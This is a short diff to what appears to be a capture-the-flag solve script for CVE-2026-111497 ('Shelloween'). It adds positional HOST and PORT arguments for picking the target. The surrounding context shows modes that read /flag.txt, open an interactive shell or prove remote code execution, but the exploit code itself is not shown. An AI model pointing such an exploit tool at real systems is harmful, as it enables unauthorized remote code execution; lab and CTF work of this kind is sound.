@@ -664,6 +664,8 @@ def solve(url: str, timeout: float, attempts: int, mode: str) -> int:
 
 def main() -> int:
     parser = argparse.ArgumentParser(description="Shelloween solve (CVE-2026-111497)")
+    parser.add_argument("host", nargs="?", help="target host (positional; with PORT)")
+    parser.add_argument("port", nargs="?", help="target port (positional; with HOST)")
     parser.add_argument("--url", default=DEFAULT_URL, help="target base URL")
     parser.add_argument("--timeout", type=float, default=30.0)
     parser.add_argument("--attempts", type=int, default=ATTEMPTS)
@@ -674,6 +676,11 @@ def main() -> int:
         help="flag = cat /flag.txt (default); shell = interactive shell; id = prove RCE",
     )
     args = parser.parse_args()
+    if args.host and args.port:
+        args.url = "http://%s:%s" % (args.host, args.port)
+    elif args.host or args.port:
+        print("FAIL: provide both HOST and PORT, or use --url", file=sys.stderr)
+        return 1
     if not 0 < args.timeout <= 120:
         print("FAIL: timeout must be in (0, 120]", file=sys.stderr)
         return 1
